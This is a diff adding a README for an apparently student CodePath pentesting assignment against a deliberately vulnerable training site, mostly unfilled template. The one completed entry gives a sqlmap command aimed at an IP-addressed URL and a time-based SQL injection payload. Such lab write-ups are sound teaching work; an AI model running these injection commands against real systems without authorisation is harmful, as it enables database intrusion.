@@ -1,2 +1,49 @@
 # Week8-liveAttack
 the is the week8 assignment for CodePath.
+# Project 8 - Pentesting Live Targets
+
+Time spent: **X** hours spent in total
+
+> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.
+
+The six possible exploits are:
+* Username Enumeration
+* Insecure Direct Object Reference (IDOR)
+* SQL Injection (SQLi)
+* Cross-Site Scripting (XSS)
+* Cross-Site Request Forgery (CSRF)
+* Session Hijacking/Fixation
+
+Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)
+
+## Blue
+
+Vulnerability #1: SQL injection
+Steps:
+Go to the blue website without loging in click on find a sales person, open Sqlmap and run it against the given URL
+sqlmap --url https://35.224.228.84/blue/public/salesperson.php?id=4 --dbs
+Sqlmap found it vulnerable to SQL with this given syntax id=4' OR SLEEP(5) AND 'ZAWi'='ZAWi
+GIF Walkthrough:
+
+
+
+Vulnerability #2: __________________
+
+
+## Green
+
+Vulnerability #1: __________________
+
+Vulnerability #2: __________________
+
+
+## Red
+
+Vulnerability #1: __________________
+
+Vulnerability #2: __________________
+
+
+## Notes
+
+Describe any challenges encountered while doing the work
